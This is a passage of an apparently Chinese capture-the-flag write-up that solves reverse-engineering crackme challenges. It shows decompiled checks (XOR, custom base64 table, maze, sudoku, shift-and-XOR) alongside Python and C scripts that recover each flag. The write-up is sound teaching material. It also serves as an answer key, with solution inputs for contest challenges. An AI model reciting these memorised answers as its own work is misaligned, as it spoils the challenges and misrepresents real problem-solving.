secret</h2><ul><li>拖入IDA找到关键字符串<code>5379637B6E30775F794F755F6B6E6F775F6234736531367D</code>,直接base16解码或者直接hex转ascii得到flag。</li></ul><h2 id="0x03-Easy-VB"><a href="#0x03-Easy-VB" class="headerlink" title="0x03 Easy VB"></a>0x03 Easy VB</h2><ul><li>用OD动态调试, 不能用IDA。</li><li>调试发现是将输入的flag与字符串<code>12345a789012345678g012345a789012</code>逐位异或,然后将结果与<code>bKPObQ@goYBGRXjtVKVSn^@kFQh[V_]O</code>比较,如果相等则输入flag正确。所以直接上脚本就行。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">a = <span class="string">'12345a789012345678g012345a789012'</span></span><br><span class="line">b = <span class="string">'bKPObQ@goYBGRXjtVKVSn^@kFQh[V_]O'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    flag += chr(ord(a[i])^ord(b[i]))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x04-冰菓"><a href="#0x04-冰菓" class="headerlink" title="0x04 冰菓"></a>0x04 冰菓</h2><ul><li>C#逆向,用dnSpy打开以后就能找到关键算法,直接逆算法就行。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191101073212.png" alt></p><ul><li>脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">L1 = [<span class="number">119</span>,<span class="number">77</span>,<span class="number">103</span>,<span class="number">79</span>,<span class="number">21</span>,</span><br><span class="line">      <span class="number">115</span>,<span class="number">133</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">87</span>,</span><br><span class="line">      <span class="number">22</span>,<span class="number">115</span>,<span class="number">103</span>,<span class="number">89</span>,<span class="number">88</span>,</span><br><span class="line">      <span class="number">93</span>,<span class="number">22</span>,<span class="number">89</span>,<span class="number">119</span>,<span class="number">81</span>]</span><br><span class="line"></span><br><span class="line">L2 = [<span class="number">57</span>,<span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag += chr( (L1[i] - L2[<span class="number">1</span>])^ L2[<span class="number">0</span>] )</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x05-PYC是啥子嘛"><a href="#0x05-PYC是啥子嘛" class="headerlink" title="0x05 PYC是啥子嘛"></a>0x05 PYC是啥子嘛</h2><ul><li>拿到PYC程序反编译以后, 可以看出来是个迷宫, 大小为10×10，稍微改改可以变成这种形式。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191101074059.png" alt></p><ul><li>要从S(Start) 走到 E(End)且路径长度最短, &amp;表示往上走, $表示往下走, 6表示往左走, 3表示往右走。</li><li>flag为 Syc{Your Input}</li></ul><h2 id="0x06-Dll-Reverse"><a href="#0x06-Dll-Reverse" class="headerlink" title="0x06 Dll Reverse"></a>0x06 Dll Reverse</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191110213533.png" alt></p><ul><li>题目加载<code>_setup0.dll</code>,调用里面的<code>_TRocMxlr</code>函数, 如果<code>_TRocMxlr</code>函数返回为true,则提示正确。 所以需要<code>sub_10001028(Str) != 0</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __usercall sub_10001028@&lt;al&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// si</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v3 = v2 / <span class="number">3</span>;</span><br><span class="line">  v18 = v2 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 % <span class="number">3</span> )</span><br><span class="line">    v4 = <span class="number">4</span> * v3 + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">4</span> * v3;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5[v4] = <span class="number">0</span>;</span><br><span class="line">  v19 = v4 - <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 - <span class="number">2</span> &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)(v1 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *(v7 - <span class="number">1</span>);</span><br><span class="line">      v9 = *v7;</span><br><span class="line">      v5[v6] = base64Table[*(v7 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v10 = base64Table[(v9 &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (v8 &amp; <span class="number">3</span>)];</span><br><span class="line">      v11 = v7[<span class="number">1</span>];</span><br><span class="line">      v5[v6 + <span class="number">1</span>] = v10;</span><br><span class="line">      v5[v6 + <span class="number">2</span>] = base64Table[(v11 &gt;&gt; <span class="number">6</span>) | <span class="number">4</span> * (v9 &amp; <span class="number">0xF</span>)];</span><br><span class="line">      v5[v6 + <span class="number">3</span>] = base64Table[v11 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v6 += <span class="number">4</span>;</span><br><span class="line">      v7 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; v19 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;v5[v6 - 2] = '==';</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v6 - <span class="number">1</span>] = <span class="string">'='</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = v5 - s1;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = s1[v13 + v12];</span><br><span class="line">    <span class="keyword">if</span> ( v12 % <span class="number">2</span> )</span><br><span class="line">      v15 = s1[v12] ^ v14;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v15 = (s1[v12] ^ v14) + <span class="number">3</span>;</span><br><span class="line">    byte_10003390[v12++] = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 &lt; <span class="number">32</span> );</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( byte_10003390[v16] == s2[v16] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v16 &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>根据伪代码, 这个函数先把我们输入的flag进行base64加密,然后分情况进行异或运算,最后与s2进行比较,如果如果一致,则成功。</p></li><li><p>注意这里的base64进行了换表!!!! 这里的base64Table为<code>BCDEFGHIJKLMNOPQSVXZRWYTUeadbcfghijklmnopqrstuvwxyz0123456789+/</code></p></li><li><p>另外:</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v12 = <span class="number">0</span>;</span><br><span class="line">v13 = v5 - s1;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v14 = s1[v13 + v12];</span><br></pre></td></tr></table></figure><ul><li><p>这一块不太容易搞清<code>v14 = s1[v13+v12]</code>到底是什么? 通过OD动态调试得知, v14每次都是依次取的flag经过base64加密以后的字符串的字符。</p></li><li><p>所以解密脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1 = <span class="string">'''</span></span><br><span class="line"><span class="string">45 6A 43 34 56 3B 4F 67  47 43 19 23 43 75 6C 67</span></span><br><span class="line"><span class="string">3B 65 54 46 42 37 01 50  55 60 49 24 18 4A 27 1F</span></span><br><span class="line"><span class="string">09 1D 4A 00</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">L1 = s1.split()</span><br><span class="line">s2 = <span class="string">'''</span></span><br><span class="line"><span class="string">22 59 32 5E  38 0B 42 56 26 70 4D 45</span></span><br><span class="line"><span class="string">13 22 2D 1D 5B 37 70 03  12 60 7C 36 07 53 03 53</span></span><br><span class="line"><span class="string">4F 78 56 26 </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">L2 = s2.split()</span><br><span class="line"><span class="keyword">print</span> L2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        ss += chr(int(L1[i],<span class="number">16</span>) ^ int(L2[i],<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss += chr(int(L1[i],<span class="number">16</span>) ^ (int(L2[i],<span class="number">16</span>) - <span class="number">3</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">print</span> ss</span><br><span class="line"></span><br><span class="line">string1 = <span class="string">"ABCDEFGHIJKLMNOPQSVXZRWYTUeadbcfghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">string2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> base64.b64decode(ss.translate(string.maketrans(string1,string2)))</span><br></pre></td></tr></table></figure><h2 id="0x07-Win32-Program"><a href="#0x07-Win32-Program" class="headerlink" title="0x07 Win32 Program"></a>0x07 Win32 Program</h2><h2 id="0x08-阅兵你认真看了么"><a href="#0x08-阅兵你认真看了么" class="headerlink" title="0x08 阅兵你认真看了么"></a>0x08 阅兵你认真看了么</h2><ul><li>官方WP如下:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230117.png" alt></p><ul><li><p>可以直接爆破MD5,字典选用ABCD,就五位,直接正向爆破得到<code>ACBAD</code> 。</p></li><li><p>也可以在线解密MD5。</p></li><li><p>可以分析到unk_2020A0为数独第一行。unk_2020C4为数独的第二行到第九行。</p></li><li><p>由此可以得到数独:</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0</span> <span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">6</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">6</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span></span><br><span class="line"><span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">8</span> <span class="number">1</span> <span class="number">0</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>在线数独求解可得</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230604.png" alt></p><ul><li><p>从而得到我们应该输入<code>679845716297812345981276642931281374512369848935677645</code></p></li><li><p>运行程序并输入两组答案<code>ACBAD</code>和<code>679845716297812345981276642931281374512369848935677645</code>即可得到flag。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230736.png" alt></p><h2 id="0x09-Python1"><a href="#0x09-Python1" class="headerlink" title="0x09 Python1"></a>0x09 Python1</h2><ul><li>这道题挺顶的,反编译以后的代码如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a &amp; <span class="number">0xffffffffffffffffL</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">'&lt;Q'</span>, str)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        a = a * <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a &gt; <span class="number">0xffffffffffffffffL</span>:</span><br><span class="line">            a = b(a)</span><br><span class="line">            a = b(a ^ <span class="number">0xb0004b7679fa26b3L</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cmp_data = [</span><br><span class="line">     <span class="number">7966260180038414229L</span>, <span class="number">16286944838295011030L</span>,</span><br><span class="line">     <span class="number">8598951912044448753L</span>, <span class="number">7047634009948092561L</span>, <span class="number">7308282357635670895L</span>]</span><br><span class="line">    input = raw_input(<span class="string">'plz input your flag:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(input) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span> - len(input) % <span class="number">8</span>):</span><br><span class="line">            input += <span class="string">'\x00'</span></span><br><span class="line"></span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input) / <span class="number">8</span>):</span><br><span class="line">        value = d(c(input[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>]))</span><br><span class="line">        arr.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> arr[i] != cmp_data[i]:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'fail'</span></span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><ul><li><p>重点在于b函数和d函数。如果a经过×2运算以后大于<code>0xffffffffffffffffL</code>(即溢出了),则先按位与<code>0xffffffffffffffffL</code>,然后再与<code>0xb0004b7679fa26b3L</code>异或,则得到的结果一定为奇数。如果a经过×2运算以后小于等于<code>0xffffffffffffffffL</code>,则一定为偶数。</p></li><li><p>另外一个关键点在于,如何还原溢出的数据?</p></li><li><p>对于这个程序,如果a×2(相当于左移1位)以后溢出了,那么损失的是最高位(转换成二进制来看),最低位会自动补为0。那么我们只需要补回来最高位(加上2的最高位次方,比如这次是加上2的64次方)然后再除以2就能得到原来的a了。</p></li><li><p>根据这些可以得出解密脚本。</p></li><li><p>鉴于C语言unsigned long long 最大有64位, 而我们的溢出位就是第64位,所以我们可以先除以2,然后再加上原本要补的值的一半,就相当于先加上要补的值然后再除以2。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C语言版解密脚本</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> answer[] = &#123; <span class="number">0x6e8dd76d3b876f95</span>L, <span class="number">0xe206da09daf4bed6</span>L,<span class="number">0x77559d346e134bf1</span>L, <span class="number">0x61ce39cac5eaf891</span>L, <span class="number">0x656c3c155520e36f</span>L &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp = answer[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp &amp; <span class="number">1</span>)<span class="comment">//结果为奇数</span></span><br><span class="line">            &#123;</span><br><span class="line">                tmp ^= <span class="number">0xb0004b7679fa26b3</span>;<span class="comment">//先异或回去。</span></span><br><span class="line">                tmp &gt;&gt;=<span class="number">1</span>;<span class="comment">//相当于除以2</span></span><br><span class="line">                tmp += <span class="number">0x8000000000000000</span>;<span class="comment">//加上要补值(2的64次方)的一半</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//结果为偶数</span></span><br><span class="line">            &#123;</span><br><span class="line">                tmp&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        answer[i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">char</span>*)answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>此刻python的优势显出来了。</li><li>Python解密脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(a % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            a /= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:            </span><br><span class="line">            a ^= <span class="number">0xB0004B7679FA26B3</span>            </span><br><span class="line">            a = a + <span class="number">0xffffffffffffffff</span> + <span class="number">1</span>            </span><br><span class="line">            a /= <span class="number">2</span>    </span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cmp_data = [<span class="number">7966260180038414229L</span>, <span class="number">16286944838295011030L</span>, <span class="number">8598951912044448753L</span>, <span class="number">7047634009948092561L</span>, <span class="number">7308282357635670895L</span>]</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        flag += struct.pack(<span class="string">"&gt;Q"</span>,decode(cmp_data[i]))[::<span class="number">-1</span>].strip()<span class="comment">#需要注意这里的[::-1],用来逆序！</span></span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x10-Python2"><a href="#0x10-Python2" class="headerlink" title="0x10 Python2"></a>0x10 Python2</h2><ul><li>反编译以后得到如下代码:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(start, end, s)</span>:</span></span><br><span class="line">    a = <span class="number">32310901</span></span><br><span class="line">    b = <span class="number">1729</span></span><br><span class="line">    c = s</span><br><span class="line">    m = end - start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = int((a * c + b) % m)</span><br><span class="line">        <span class="keyword">yield</span> d</span><br><span class="line">        c = d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    arr = [</span><br><span class="line">     <span class="number">77</span>, <span class="number">263</span>, <span class="number">394</span>, <span class="number">442</span>, <span class="number">463</span>, <span class="number">512</span>, <span class="number">667</span>, <span class="number">641</span>, <span class="number">804</span>, <span 